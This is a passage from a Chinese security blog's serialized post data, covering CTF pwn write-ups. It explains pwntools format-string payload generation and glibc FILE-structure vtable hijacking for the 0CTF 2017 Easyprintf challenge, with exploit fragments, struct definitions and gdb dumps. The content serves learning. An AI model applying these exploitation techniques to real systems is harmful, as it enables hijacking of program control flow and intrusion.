fmtstr_payload(fmt.offset, writes, 0, 'byte')\n    p.sendline(payload)\n    \nif __name__ == '__main__':\n    pwn()\n    p.interactive()\n```\n最后的payload使180长度，但是最大长度是158- -。。\n\n## 关于FmtStr\n\npwntools中的fmtstr还是很有趣的，唯一的不足就是生成的payload太长了- -因为据观察完全是用`hhn`来修改的（因为只能指定一个只能为`hhn`or`hn`or`n`中的一种来生成payload），大概是作者懒了没想设计别的算法把- -\n\n先看下给出的example\n```\n>>> program = tempfile.mktemp()\n>>> source  = program + \".c\"\n>>> write(source, '''\n... #include <stdio.h>\n... #include <stdlib.h>\n... #include <unistd.h>\n... #include <sys/mman.h>\n... #define MEMORY_ADDRESS ((void*)0x11111000)\n... #define MEMORY_SIZE 1024\n... #define TARGET ((int *) 0x11111110)\n... int main(int argc, char const *argv[])\n... {\n...        char buff[1024];\n...        void *ptr = NULL;\n...        int *my_var = TARGET;\n...        ptr = mmap(MEMORY_ADDRESS, MEMORY_SIZE, PROT_READ|PROT_WRITE, MAP_FIXED|MAP_ANONYMOUS|MAP_PRIVATE, 0, 0);\n...        if(ptr != MEMORY_ADDRESS)\n...        {\n...                perror(\"mmap\");\n...                return EXIT_FAILURE;\n...        }\n...        *my_var = 0x41414141;\n...        write(1, &my_var, sizeof(int *));\n...        scanf(\"%s\", buff);\n...        dprintf(2, buff);\n...        write(1, my_var, sizeof(int));\n...        return 0;\n... }''')\n>>> cmdline = [\"gcc\", source, \"-Wno-format-security\", \"-m32\", \"-o\", program]\n>>> process(cmdline).wait_for_close()\n>>> def exec_fmt(payload):\n...     p = process(program)\n...     p.sendline(payload)\n...     return p.recvall()\n...\n>>> autofmt = FmtStr(exec_fmt)\n>>> offset = autofmt.offset\n>>> p = process(program, stderr=PIPE)\n>>> addr = unpack(p.recv(4))\n>>> payload = fmtstr_payload(offset, {addr: 0x1337babe})\n>>> p.sendline(payload)\n>>> print hex(unpack(p.recv(4)))\n0x1337babe\n```\n\n主要就是一个类，一个函数：\n`class pwnlib.fmtstr.FmtStr(execute_fmt, offset=None, padlen=0, numbwritten=0)`\n`pwnlib.fmtstr.fmtstr_payload(offset, writes, numbwritten=0, write_size='byte') → str`\n\n其中上面的那个类可以用来完成fsb的所有操作，下面那个方法主要是用来产生payload用。\n+ execute_fmt 一个存在fsb的process，我们通过这个process的交互过程来得到fsb的一些基本信息\n+ offset 偏移，没有给出的话会通过栈泄露自动给出\n+ padlen payload之前填充的字符数\n+ numbwritem 生成的此payload（包括填充）之前的偏移量\n\n看了看源码，发现`成员名`和`参数名`是同名的，直接调用即可。我们其实可以主要用这个来得到`FmtStr.offset`即可。\n实例化一个类后，通过`write(addr, data) `来控制想要修改的地址和数据，可以通过一个字典来传参**（data(int)）**。\n最后通过`execute_writes() `方法来调用`fmtstr_payload`生成payload并发送出去。\n\n我们也可以直接调用`fmtstr_payload(offset, writes, numbwritten=0, write_size='byte')`这个方法来只生成payload。\n给下参数，没啥特别的\n+ offset (int) – the first formatter’s offset you control\n+ writes (dict) – dict with addr, value {addr: value, addr2: value2}\n+ numbwritten (int) – number of byte already written by the printf function\n+ write_size (str) – must be byte, short or int. Tells if you want to write byte by byte, short by short or int by int (hhn, hn or n)","slug":"Pwn的FILE结构体","published":1,"updated":"2017-04-14T03:18:26.527Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjcpz0k1q0039hv18odd57f6g","content":"<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>神tm的，我写了两个半小时的文章啊，就这么没了。就在我随手把浏览器关掉的时候意识到，“等等，我好像忘了什么东西”，果然。。没有断电保存功能的编辑器坑啊。。<br>(╯‵□′)╯︵┻━┻<br>(╯‵□′)╯︵┻━┻<br>(╯‵□′)╯︵┻━┻<br>好了回到FILE结构体这个问题上来。由于两次碰见这个东西了，意识到似乎比赛中开始多了起来，于是趁热学习下，提高自己的姿势水平。</p>\n<h2 id=\"FILE结构体\"><a href=\"#FILE结构体\" class=\"headerlink\" title=\"FILE结构体\"></a>FILE结构体</h2><p>首先我们知道linux中遵循“所有接口皆文件”的原则，输入输出做成了文件的形式。</p>\n<p>以下所有关键词搜索命令为<br><code>grep -rn &quot;struct _IO_FILE {&quot; --include=&quot;*.h&quot; /usr/include</code></p>\n<p>其中<code>_IO_2_1_stdout_</code>的结构体如下：</p>\n<p><code>glibc-2.24/libio/libio.h</code><br><figure class=\"highlight rust\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">extern</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">_IO_FILE_plus</span></span> _IO_2_1_stdin_;</div><div class=\"line\"><span class=\"keyword\">extern</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">_IO_FILE_plus</span></span> _IO_2_1_stdout_;</div><div class=\"line\"><span class=\"keyword\">extern</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">_IO_FILE_plus</span></span> _IO_2_1_stderr_;</div></pre></td></tr></table></figure></p>\n<p>我们查看<code>_IO_FILE_plus</code>的结构体定义<br><code>/root/desktop/glibc-2.24/libio/libioP.h</code><br><figure class=\"highlight rust\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">/* We always allocate an extra word following an _IO_FILE.</span></div><div class=\"line\">   This contains a pointer to the function jump table used.</div><div class=\"line\">   This is for compatibility with C++ streambuf; the word can</div><div class=\"line\">   be used to smash to a pointer to a virtual function table. */</div><div class=\"line\"></div><div class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">_IO_FILE_plus</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">  _IO_FILE file;</div><div class=\"line\">  <span class=\"keyword\">const</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">_IO_jump_t</span></span> *vtable;</div><div class=\"line\">&#125;;</div></pre></td></tr></table></figure></p>\n<p>这里也解释了之所以下面加上函数指针，做成类似虚表的形式，是为了与C++的流兼容。</p>\n<p>下面来查看两个关键结构<code>_IO_FILE</code>和<code>_IO_jump_t</code>：<br><code>_IO_FILE</code>在<code>/usr/include/libio.h</code>中<br><figure class=\"highlight sqf\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div></pre></td><td class=\"code\"><pre><div class=\"line\">struct <span class=\"variable\">_IO_FILE</span> &#123;</div><div class=\"line\">  int <span class=\"variable\">_flags</span>;\t\t<span class=\"comment\">/* High-order word is _IO_MAGIC; rest is flags. */</span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> _IO_file_flags _flags</span></div><div class=\"line\"></div><div class=\"line\">  <span class=\"comment\">/* The following pointers correspond to the C++ streambuf protocol. */</span></div><div class=\"line\">  <span class=\"comment\">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></div><div class=\"line\">  char* <span class=\"variable\">_IO_read_ptr</span>;\t<span class=\"comment\">/* Current read pointer */</span></div><div class=\"line\">  char* <span class=\"variable\">_IO_read_end</span>;\t<span class=\"comment\">/* End of get area. */</span></div><div class=\"line\">  char* <span class=\"variable\">_IO_read_base</span>;\t<span class=\"comment\">/* Start of putback+get area. */</span></div><div class=\"line\">  char* <span class=\"variable\">_IO_write_base</span>;\t<span class=\"comment\">/* Start of put area. */</span></div><div class=\"line\">  char* <span class=\"variable\">_IO_write_ptr</span>;\t<span class=\"comment\">/* Current put pointer. */</span></div><div class=\"line\">  char* <span class=\"variable\">_IO_write_end</span>;\t<span class=\"comment\">/* End of put area. */</span></div><div class=\"line\">  char* <span class=\"variable\">_IO_buf_base</span>;\t<span class=\"comment\">/* Start of reserve area. */</span></div><div class=\"line\">  char* <span class=\"variable\">_IO_buf_end</span>;\t<span class=\"comment\">/* End of reserve area. */</span></div><div class=\"line\">  <span class=\"comment\">/* The following fields are used to support backing up and undo. */</span></div><div class=\"line\">  char *<span class=\"variable\">_IO_save_base</span>; <span class=\"comment\">/* Pointer to start of non-current get area. */</span></div><div class=\"line\">  char *<span class=\"variable\">_IO_backup_base</span>;  <span class=\"comment\">/* Pointer to first valid character of backup area */</span></div><div class=\"line\">  char *<span class=\"variable\">_IO_save_end</span>; <span class=\"comment\">/* Pointer to end of non-current get area. */</span></div><div class=\"line\"></div><div class=\"line\">  struct <span class=\"variable\">_IO_marker</span> *<span class=\"variable\">_markers</span>;</div><div class=\"line\"></div><div class=\"line\">  struct <span class=\"variable\">_IO_FILE</span> *<span class=\"variable\">_chain</span>;</div><div class=\"line\"></div><div class=\"line\">  int <span class=\"variable\">_fileno</span>;</div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">if</span> 0</span></div><div class=\"line\">  int <span class=\"variable\">_blksize</span>;</div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">else</span></span></div><div class=\"line\">  int <span class=\"variable\">_flags2</span>;</div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">endif</span></span></div><div class=\"line\">  <span class=\"variable\">_IO_off_t</span> <span class=\"variable\">_old_offset</span>; <span class=\"comment\">/* This used to be _offset but it's too small.  */</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __HAVE_COLUMN <span class=\"comment\">/* temporary */</span></span></div><div class=\"line\">  <span class=\"comment\">/* 1+column number of pbase(); 0 is unknown. */</span></div><div class=\"line\">  unsigned short <span class=\"variable\">_cur_column</span>;</div><div class=\"line\">  signed char <span class=\"variable\">_vtable_offset</span>;</div><div class=\"line\">  char <span class=\"variable\">_shortbuf</span>[<span class=\"number\">1</span>];</div><div class=\"line\"></div><div class=\"line\">  <span class=\"comment\">/*  char* _save_gptr;  char* _save_egptr; */</span></div><div class=\"line\"></div><div class=\"line\">  <span class=\"variable\">_IO_lock_t</span> *<span class=\"variable\">_lock</span>;</div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">ifdef</span> _IO_USE_OLD_IO_FILE</span></div><div class=\"line\">&#125;;</div></pre></td></tr></table></figure></p>\n<p><code>_IO_jump_t</code>在<code>/root/desktop/glibc-2.24/libio/fileops.c</code>中<br><figure class=\"highlight mipsasm\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div></pre></td><td class=\"code\"><pre><div class=\"line\">const struct _IO_jump_t _IO_file_jumps libio_vtable =</div><div class=\"line\">&#123;</div><div class=\"line\">  <span class=\"keyword\">JUMP_INIT_DUMMY,</span></div><div class=\"line\">  <span class=\"keyword\">JUMP_INIT(finish, </span>_IO_file_finish),</div><div class=\"line\">  <span class=\"keyword\">JUMP_INIT(overflow, </span>_IO_file_overflow),</div><div class=\"line\">  <span class=\"keyword\">JUMP_INIT(underflow, </span>_IO_file_underflow),</div><div class=\"line\">  <span class=\"keyword\">JUMP_INIT(uflow, </span>_IO_default_uflow),</div><div class=\"line\">  <span class=\"keyword\">JUMP_INIT(pbackfail, </span>_IO_default_pbackfail),</div><div class=\"line\">  <span class=\"keyword\">JUMP_INIT(xsputn, </span>_IO_file_xsputn),</div><div class=\"line\">  <span class=\"keyword\">JUMP_INIT(xsgetn, </span>_IO_file_xsgetn),</div><div class=\"line\">  <span class=\"keyword\">JUMP_INIT(seekoff, </span>_IO_new_file_seekoff),</div><div class=\"line\">  <span class=\"keyword\">JUMP_INIT(seekpos, </span>_IO_default_seekpos),</div><div class=\"line\">  <span class=\"keyword\">JUMP_INIT(setbuf, </span>_IO_new_file_setbuf),</div><div class=\"line\">  <span class=\"keyword\">JUMP_INIT(sync, </span>_IO_new_file_sync),</div><div class=\"line\">  <span class=\"keyword\">JUMP_INIT(doallocate, </span>_IO_file_doallocate),</div><div class=\"line\">  <span class=\"keyword\">JUMP_INIT(read, </span>_IO_file_read),</div><div class=\"line\">  <span class=\"keyword\">JUMP_INIT(write, </span>_IO_new_file_write),</div><div class=\"line\">  <span class=\"keyword\">JUMP_INIT(seek, </span>_IO_file_seek),</div><div class=\"line\">  <span class=\"keyword\">JUMP_INIT(close, </span>_IO_file_close),</div><div class=\"line\">  <span class=\"keyword\">JUMP_INIT(stat, </span>_IO_file_stat),</div><div class=\"line\">  <span class=\"keyword\">JUMP_INIT(showmanyc, </span>_IO_default_showmanyc),</div><div class=\"line\">  <span class=\"keyword\">JUMP_INIT(imbue, </span>_IO_default_imbue)</div><div class=\"line\">&#125;<span class=\"comment\">;</span></div></pre></td></tr></table></figure></p>\n<p>再结合gdb查看内存能够得到更直观的理解：<br><figure class=\"highlight x86asm\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div></pre></td><td class=\"code\"><pre><div class=\"line\">wndbg&gt; telescope <span class=\"number\">0xf771fd60</span> <span class=\"number\">40</span></div><div class=\"line\"><span class=\"number\">00</span>:<span class=\"number\">0000</span>│   <span class=\"number\">0xf771fd60</span> (_IO_2_1_stdout_) ◂— <span class=\"number\">0xfbad2887</span></div><div class=\"line\"><span class=\"number\">01</span>:<span class=\"number\">0004</span>│   <span class=\"number\">0xf771fd64</span> (_IO_2_1_stdout_+<span class=\"number\">4</span>) —▸ <span class=\"number\">0xf771fda7</span> (_IO_2_1_stdout_+<span class=\"number\">71</span>) ◂— <span class=\"number\">0x7208700a</span></div><div class=\"line\">... ↓</div><div class=\"line\"><span class=\"number\">08</span>:<span class=\"number\">0020</span>│   <span class=\"number\">0xf771fd80</span> (_IO_2_1_stdout_+<span class=\"number\">32</span>) —▸ <span class=\"number\">0xf771fda8</span> (_IO_2_1_stdout_+<span class=\"number\">72</span>) —▸ <span class=\"number\">0xf7720870</span> ◂— <span class=\"number\">0x0</span></div><div class=\"line\"><span class=\"number\">09</span>:<span class=\"number\">0024</span>│   <span class=\"number\">0xf771fd84</span> (_IO_2_1_stdout_+<span class=\"number\">36</span>) ◂— <span class=\"number\">0x0</span></div><div class=\"line\">... ↓</div><div class=\"line\"><span class=\"number\">0d</span>:<span class=\"number\">0034</span>│   <span class=\"number\">0xf771fd94</span> (_IO_2_1_stdout_+<span class=\"number\">52</span>) —▸ <span class=\"number\">0xf771f5a0</span> (_IO_2_1_stdin_) ◂— <span class=\"number\">0xfbad208b</span></div><div class=\"line\">0e:<span class=\"number\">0038</span>│   <span class=\"number\">0xf771fd98</span> (_IO_2_1_stdout_+<span class=\"number\">56</span>) ◂— <span class=\"number\">0x1</span></div><div class=\"line\">0f:003c│   <span class=\"number\">0xf771fd9c</span> (_IO_2_1_stdout_+<span class=\"number\">60</span>) ◂— <span class=\"number\">0x0</span></div><div class=\"line\"><span class=\"number\">10</span>:<span class=\"number\">0040</span>│   <span class=\"number\">0xf771fda0</span> (_IO_2_1_stdout_+<span class=\"number\">64</span>) ◂— <span class=\"number\">0xffffffff</span></div><div class=\"line\"><span class=\"number\">11</span>:<span class=\"number\">0044</span>│   <span class=\"number\">0xf771fda4</span> (_IO_2_1_stdout_+<span class=\"number\">68</span>) ◂— <span class=\"number\">0xa000000</span></div><div class=\"line\"><span class=\"number\">12</span>:<span class=\"number\">0048</span>│   <span class=\"number\">0xf771fda8</span> (_IO_2_1_stdout_+<span class=\"number\">72</span>) —▸ <span class=\"number\">0xf7720870</span> ◂— <span class=\"number\">0x0</span></div><div class=\"line\"><span class=\"number\">13</span>:004c│   <span class=\"number\">0xf771fdac</span> (_IO_2_1_stdout_+<span class=\"number\">76</span>) ◂— <span class=\"number\">0xffffffff</span></div><div class=\"line\">... ↓</div><div class=\"line\"><span class=\"number\">15</span>:<span class=\"number\">0054</span>│   <span class=\"number\">0xf771fdb4</span> (_IO_2_1_stdout_+<span class=\"number\">84</span>) ◂— <span class=\"number\">0x0</span></div><div class=\"line\"><span class=\"number\">16</span>:<span class=\"number\">0058</span>│   <span class=\"number\">0xf771fdb8</span> (_IO_2_1_stdout_+<span class=\"number\">88</span>) —▸ <span class=\"number\">0xf771f4e0</span> ◂— <span class=\"number\">0x0</span></div><div class=\"line\"><span class=\"number\">17</span>:005c│   <span class=\"number\">0xf771fdbc</span> (_IO_2_1_stdout_+<span class=\"number\">92</span>) ◂— <span class=\"number\">0x0</span></div><div class=\"line\">... ↓</div><div class=\"line\">1a:<span class=\"number\">0068</span>│   <span class=\"number\">0xf771fdc8</span> (_IO_2_1_stdout_+<span class=\"number\">104</span>) ◂— <span class=\"number\">0xffffffff</span></div><div class=\"line\"><span class=\"number\">1b</span>:006c│   <span class=\"number\">0xf771fdcc</span> (_IO_2_1_stdout_+<span class=\"number\">108</span>) ◂— <span class=\"number\">0x0</span></div><div class=\"line\">... ↓</div><div class=\"line\"><span class=\"number\">25</span>:<span class=\"number\">0094</span>│   <span class=\"number\">0xf771fdf4</span> (_IO_2_1_stdout_+<span class=\"number\">148</span>) —▸ <span class=\"number\">0xf771d960</span> (_IO_file_jumps) ◂— <span class=\"number\">0x0</span></div><div class=\"line\"><span class=\"number\">26</span>:<span class=\"number\">0098</span>│   <span class=\"number\">0xf771fdf8</span> (stderr) —▸ <span class=\"number\">0xf771fcc0</span> (_IO_2_1_stderr_) ◂— <span class=\"number\">0xfbad2087</span></div><div class=\"line\"><span class=\"number\">27</span>:009c│   <span class=\"number\">0xf771fdfc</span> (stdout) —▸ <span class=\"number\">0xf771fd60</span> (_IO_2_1_stdout_) ◂— <span class=\"number\">0xfbad2887</span></div><div class=\"line\">pwndbg&gt; telescope <span class=\"number\">0xf771d960</span> <span class=\"number\">30</span></div><div class=\"line\"><span class=\"number\">00</span>:<span class=\"number\">0000</span>│   <span class=\"number\">0xf771d960</span> (_IO_file_jumps) ◂— <span class=\"number\">0x0</span></div><div class=\"line\">... ↓</div><div class=\"line\"><span class=\"number\">02</span>:<span class=\"number\">0008</span>│   <span class=\"number\">0xf771d968</span> (_IO_file_jumps+<span class=\"number\">8</span>) —▸ <span class=\"number\">0xf75d6040</span> (_IO_file_finish) ◂— <span class=\"keyword\">push</span>   <span class=\"built_in\">edi</span></div><div class=\"line\"><span class=\"number\">03</span>:000c│   <span class=\"number\">0xf771d96c</span> (_IO_file_jumps+<span class=\"number\">12</span>) —▸ <span class=\"number\">0xf75d6b00</span> (_IO_file_overflow) ◂— <span class=\"keyword\">push</span>   <span class=\"built_in\">ebp</span></div><div class=\"line\"><span class=\"number\">04</span>:<span class=\"number\">0010</span>│   <span class=\"number\">0xf771d970</span> (_IO_file_jumps+<span class=\"number\">16</span>) —▸ <span class=\"number\">0xf75d6810</span> (_IO_file_underflow) ◂— <span class=\"keyword\">push</span>   <span class=\"built_in\">ebp</span></div><div class=\"line\"><span class=\"number\">05</span>:<span class=\"number\">0014</span>│   <span class=\"number\">0xf771d974</span> (_IO_file_jumps+<span class=\"number\">20</span>) —▸ <span class=\"number\">0xf75d7a40</span> (_IO_default_uflow) ◂— <span class=\"keyword\">push</span>   <span class=\"built_in\">esi</span></div><div class=\"line\"><span class=\"number\">06</span>:<span class=\"number\">0018</span>│   <span class=\"number\">0xf771d978</span> (_IO_file_jumps+<span class=\"number\">24</span>) —▸ <span class=\"number\">0xf75d8b50</span> (_IO_default_pbackfail) ◂— <span class=\"keyword\">push</span>   <span class=\"built_in\">ebp</span></div><div class=\"line\"><span class=\"number\">07</span>:001c│   <span class=\"number\">0xf771d97c</span> (_IO_file_jumps+<span class=\"number\">28</span>) —▸ <span class=\"number\">0xf75d5c50</span> (_IO_file_xsputn) ◂— <span class=\"keyword\">push</span>   <span class=\"built_in\">ebp</span></div><div class=\"line\"><span class=\"number\">08</span>:<span class=\"number\">0020</span>│   <span class=\"number\">0xf771d980</span> (_IO_file_jumps+<span class=\"number\">32</span>) —▸ <span class=\"number\">0xf75d5790</span> ◂— <span class=\"keyword\">push</span>   <span class=\"built_in\">ebp</span></div><div class=\"line\"><span class=\"number\">09</span>:<span class=\"number\">0024</span>│   <span class=\"number\">0xf771d984</span> (_IO_file_jumps+<span class=\"number\">36</span>) —▸ <span class=\"number\">0xf75d4730</span> (_IO_file_seekoff) ◂— <span class=\"keyword\">push</span>   <span class=\"built_in\">ebp</span></div><div class=\"line\">0a:<span class=\"number\">0028</span>│   <span class=\"number\">0xf771d988</span> (_IO_file_jumps+<span class=\"number\">40</span>) —▸ <span class=\"number\">0xf75d7dd0</span> ◂— <span class=\"keyword\">push</span>   <span class=\"built_in\">ebp</span></div><div class=\"line\"><span class=\"number\">0b</span>:002c│   <span class=\"number\">0xf771d98c</span> (_IO_file_jumps+<span class=\"number\">44</span>) —▸ <span class=\"number\">0xf75d44b0</span> (_IO_file_setbuf) ◂— <span class=\"keyword\">push</span>   <span class=\"built_in\">esi</span></div><div class=\"line\">0c:<span class=\"number\">0030</span>│   <span class=\"number\">0xf771d990</span> (_IO_file_jumps+<span class=\"number\">48</span>) —▸ <span class=\"number\">0xf75d4300</span> (_IO_file_sync) ◂— <span class=\"keyword\">push</span>   <span class=\"built_in\">ebp</span></div><div class=\"line\"><span class=\"number\">0d</span>:<span class=\"number\">0034</span>│   <span class=\"number\">0xf771d994</span> (_IO_file_jumps+<span class=\"number\">52</span>) —▸ <span class=\"number\">0xf75c93b0</span> (_IO_file_doallocate) ◂— <span class=\"keyword\">push</span>   <span class=\"built_in\">ebp</span></div><div class=\"line\">0e:<span class=\"number\">0038</span>│   <span class=\"number\">0xf771d998</span> (_IO_file_jumps+<span class=\"number\">56</span>) —▸ <span class=\"number\">0xf75d5c00</span> (_IO_file_read) ◂— <span class=\"keyword\">push</span>   <span class=\"built_in\">esi</span></div><div class=\"line\">0f:003c│   <span class=\"number\">0xf771d99c</span> (_IO_file_jumps+<span class=\"number\">60</span>) —▸ <span class=\"number\">0xf75d55b0</span> (_IO_file_write) ◂— <span class=\"keyword\">push</span>   <span class=\"built_in\">ebp</span></div><div class=\"line\"><span class=\"number\">10</span>:<span class=\"number\">0040</span>│   <span class=\"number\">0xf771d9a0</span> (_IO_file_jumps+<span class=\"number\">64</span>) —▸ <span class=\"number\">0xf75d5210</span> (_IO_file_seek) ◂— <span class=\"keyword\">push</span>   <span class=\"built_in\">ebx</span></div><div class=\"line\"><span class=\"number\">11</span>:<span class=\"number\">0044</span>│   <span class=\"number\">0xf771d9a4</span> (_IO_file_jumps+<span class=\"number\">68</span>) —▸ <span class=\"number\">0xf75d4480</span> (_IO_file_close) ◂— <span class=\"keyword\">push</span>   <span class=\"built_in\">ebx</span></div><div class=\"line\"><span class=\"number\">12</span>:<span class=\"number\">0048</span>│   <span class=\"number\">0xf771d9a8</span> (_IO_file_jumps+<span class=\"number\">72</span>) —▸ <span class=\"number\">0xf75d5590</span> (_IO_file_stat) ◂— <span class=\"keyword\">sub</span>    <span class=\"built_in\">esp</span>, <span class=\"number\">0x10</span></div><div class=\"line\"><span class=\"number\">13</span>:004c│   <span class=\"number\">0xf771d9ac</span> (_IO_file_jumps+<span class=\"number\">76</span>) —▸ <span class=\"number\">0xf75d8ce0</span> ◂— <span class=\"keyword\">mov</span>    <span class=\"built_in\">eax</span>, <span class=\"number\">0xffffffff</span></div><div class=\"line\"><span class=\"number\">14</span>:<span class=\"number\">0050</span>│   <span class=\"number\">0xf771d9b0</span> (_IO_file_jumps+<span class=\"number\">80</span>) —▸ <span class=\"number\">0xf75d8cf0</span> ◂— <span class=\"keyword\">ret</span></div></pre></td></tr></table></figure></p>\n<h2 id=\"利用原理\"><a href=\"#利用原理\" class=\"headerlink\" title=\"利用原理\"></a>利用原理</h2><p>我们平时调用文件族的函数的时候（包括一些输入输出），最后都会通过虚表来调用函数，如果我们可以通过修改<code>signed char _vtable_offset</code>使其指向一个我们伪造的虚表，那么我们就可以控制eip。</p>\n<p>利用思路：</p>\n<ol>\n<li>控制<code>_IO_FILE_plus</code>或<code>_IO_FILE</code>结构体的<code>signed char _vtable_offset</code>偏移使其指向我们伪造的虚表。</li>\n<li>伪造虚表中函数为我们希望程序调用的函数如<code>system</code></li>\n</ol>\n<p>利用条件：</p>\n<ol>\n<li>可泄露<code>libc</code>基址</li>\n<li>有一次任意地址写的机会</li>\n<li>存在一个我们知道地址的可控区域</li>\n</ol>\n<h2 id=\"例题\"><a href=\"#例题\" class=\"headerlink\" title=\"例题\"></a>例题</h2><p>下面用20170ctf的Easyprintf来为例分析</p>\n<blockquote>\n<p>程序在进行一次任意地址读之后有一次格式化字符串的机会，之后直接exit。在程序启用Full RELRO的情况下，选择覆盖libc中的<code>_IO_2_1_stdout_</code>结构的虚表，因为<code>printf</code>在将所有输入解析之后会调用其中的某个函数进行输出，我们可以其改为<code>system</code>，而这个结构自身会作为参数传入，覆盖虚表之后将一个<code>sh\\0\\0</code>写到整个结构头部即可。</p>\n</blockquote>\n<p>先放上没什么卵用但是应该是对的并且学到了东西的exp。。。。<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></div><div class=\"line\"><span class=\"comment\"># coding=utf-8</span></div><div class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</div><div class=\"line\"></div><div class=\"line\">slog = <span class=\"number\">1</span></div><div class=\"line\">local = <span class=\"number\">1</span></div><div class=\"line\">debug = <span class=\"number\">0</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">global</span> p</div><div class=\"line\"></div><div class=\"line\"><span 